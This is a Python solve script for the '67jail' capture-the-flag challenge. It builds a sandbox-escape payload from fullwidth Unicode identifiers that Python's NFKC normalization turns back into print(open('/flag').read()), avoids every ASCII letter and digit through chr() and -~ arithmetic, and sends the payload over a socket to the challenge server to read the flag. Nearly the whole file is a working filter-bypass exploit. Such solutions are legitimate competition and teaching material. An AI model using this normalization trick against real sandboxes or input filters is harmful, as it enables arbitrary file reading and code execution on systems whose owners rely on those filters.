#!/usr/bin/env python3
"""Solve 67jail using Python's NFKC identifier normalization."""

import argparse
import getpass
import os
import re
import socket
import unicodedata


FLAG_RE = re.compile(rb"THJCC\{[^\r\n}]*\}")
TARGET_LENGTH = 6767


def fullwidth(name: str) -> str:
    """Convert ASCII letters to their fullwidth Unicode forms."""
    return "".join(chr(ord(character) + 0xFEE0) for character in name)


def integer(value: int) -> str:
    """Construct a non-negative integer without ASCII alphanumeric bytes."""
    # ([]<[]) is False (0), and -~x is x + 1.
    return "-~" * value + "([]<[])"


def string(value: str) -> str:
    """Build a string as normalized fullwidth chr(...) calls."""
    normalized_chr = fullwidth("chr")
    return "+".join(
        f"{normalized_chr}({integer(ord(character))})" for character in value
    )


def build_payload(path: str = "/flag") -> str:
    payload = (
        f"{fullwidth('print')}("
        f"{fullwidth('open')}({string(path)})."
        f"{fullwidth('read')}())"
    )

    if len(payload) > TARGET_LENGTH:
        raise ValueError("payload exceeds the jail length limit")

    payload += " " * (TARGET_LENGTH - len(payload))

    banned_characters = "'\"_`\\#"
    assert len(payload) == TARGET_LENGTH
    assert not any(character in payload for character in banned_characters)
    assert not any(
        character.isascii() and character.isalnum() for character in payload
    )
    assert payload.count(";") <= 1
    assert not any(
        character.isidentifier()
        and unicodedata.normalize("NFKC", character) == character
        for character in payload
    )
    return payload


def receive_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError(f"connection closed before {marker!r}")
        data.extend(chunk)
    return bytes(data)


def solve(host: str, port: int, token: str) -> str:
    payload = build_payload()

    with socket.create_connection((host, port), timeout=10) as sock:
        receive_until(sock, b"token: ")
        sock.sendall(token.encode() + b"\n")

        receive_until(sock, b"your chosen(please enter number): ")
        sock.sendall(b"3\n")

        challenge = receive_until(sock, b"nonce: ")
        match = re.search(rb"Please enter (\d+)", challenge)
        if not match:
            raise RuntimeError("failed to parse the human-verification nonce")
        sock.sendall(match.group(1) + b"\n")

        receive_until(sock, b">> ")
        sock.sendall(payload.encode("utf-8") + b"\n")

        response = bytearray()
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response.extend(chunk)

    flag = FLAG_RE.search(response)
    if not flag:
        raise RuntimeError(f"flag not found in response: {bytes(response)!r}")
    return flag.group(0).decode()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="chal.thjcc.org")
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--token", default=os.environ.get("CTFD_TOKEN"))
    args = parser.parse_args()

    token = args.token or getpass.getpass("CTFd API token: ")
    print(f"[+] payload length: {len(build_payload())}")
    print(f"[+] flag: {solve(args.host, args.port, token)}")


if __name__ == "__main__":
    main()
